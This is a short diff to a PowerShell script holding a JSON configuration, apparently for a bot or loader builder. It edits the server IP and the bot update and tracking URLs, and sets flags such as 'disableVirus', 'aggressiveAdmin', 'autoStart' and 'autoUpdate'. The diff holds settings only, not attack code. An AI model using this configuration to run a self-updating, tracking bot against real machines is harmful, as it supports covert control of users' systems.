@@ -1,20 +1,17 @@
 
 $server = @'
 {
-  "version": "2026.04.03 13:33:47",
+  "version": "2026.04.19 16:26:54",
   "urlDoc": "",
   "disabled": false,
   "disableVirus": false,
-  "serverIp": "192.168.0.92",
+  "serverIp": "26.188.115.1",
   "server": "default",
-  "htmlTemplateSponsorFile": "C:\\soft\\hephaestus\\php\\.\\download.html",
-  "primaryDns": "192.168.0.92",
-  "secondaryDns": "192.168.0.92",
   "extraUpdate": false,
-  "updateUrl": "http://192.168.0.92/bot/update",
+  "updateUrl": "http://123/bot/update",
   "track": true,
   "trackDesktop": false,
-  "trackUrl": "http://192.168.0.92/bot/upsert",
+  "trackUrl": "http://123/bot/upsert",
   "autoStart": true,
   "autoUpdate": true,
   "aggressiveAdmin": true,
@@ -30,7 +27,6 @@ $server = @'
   "frontForce": false,
   "front": [],
   "embeddingsForce": false,
-  "embeddings": [],
-  "certToolExe": "C:\\soft\\hephaestus\\output\\certtool.exe"
+  "embeddings": []
 }
 '@ | ConvertFrom-Json
